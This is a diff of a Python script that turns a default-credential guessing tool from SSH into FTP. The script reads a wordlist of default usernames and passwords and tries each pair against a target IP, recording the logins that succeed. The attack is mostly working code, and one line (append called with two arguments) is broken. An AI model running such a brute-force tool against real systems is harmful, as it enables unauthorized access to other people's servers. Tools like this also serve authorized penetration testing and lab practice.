@@ -1,13 +1,14 @@
-import paramiko
-from paramiko import SSHClient
+import ftplib
 from sys import argv
 from sys import stdout
 from time import sleep
+import _socket
 
 # Loads in the host IP address provided through stdin
 ip = str(argv[1])
 
 # Load in the list of usernames + passwords to test
+# We'll use the same username and passwords as SSH.
 opn = open('wordlists/default_ssh.txt', 'r')
 default_logins = [ i.strip() for i in opn.readlines() ]
 opn.close()
@@ -15,23 +16,34 @@ opn.close()
 # We'll store the possibly valid credentials in here
 valid_logins = []
 
-# Setup the SSHClient we will use to test logins
-client = SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-paramiko.util.log_to_file("/dev/null") # Don't care, Didn't ask, Plus you're a computer script
 
-# Will attempt an ssh login on the host- returns True if no authentication error
-# returns false, if there's an SSHException (general misc exception, likely caused
-# by the script logging in too many times) the function will return None
-def attempt_login(username, password, timeout=200):
+# Test a login, we'll kill and restart the connection each time
+# this is to avoid certain session timeout errors.
+def attempt_login(username, password, timeout=30):
     try:
-        client.connect(hostname=ip, username=username, password=password)
+        client = ftplib.FTP(ip, timeout=timeout)
+        client.login(username, password)
+        valid_logins.append(username, password)
+        client.quit()
         return True
-    except paramiko.ssh_exception.AuthenticationException:
+    except ftplib.error_perm as e:
+        client.quit()
         return False
-    except paramiko.ssh_exception.SSHException:
-        return None
-
+#   except ConnectionRefusedError as e:
+#       print("Unable to connect to FTP on port 21")
+#       exit()
+    except KeyboardInterrupt as e:
+        print("Quiting..")
+        exit()
+    except _socket.gaierror as e:
+        print(e)
+        exit()
+    except OSError as e:
+        print(e)
+        exit()
+#   except Exception as e:
+#       print("Unkown exception")
+#       return None
 
 # Now just try all the logins from the list
 def try_all_logins(login_list):
@@ -50,13 +62,6 @@ def try_all_logins(login_list):
             no_answer.append(i)
             continue
     return no_answer
-
-
-# Print out a little header so the user knows the program is actually running
-print("Trying default_ssh.txt on ssh login...")
-
-# Zuko, it's time to look deep inside yourself and ask the big questions:
-# For loop, or while loop !?!
 
 # The code below will try all the logins, and record if it gets a valid login or a failed login.
 # If the answer isn't clear, it will add the credentials back to the list and try again. This
@@ -80,4 +85,3 @@ if not len(valid_logins) == 0:
         print("  --> " + i)
 else:
     print("  --> None :c")
-
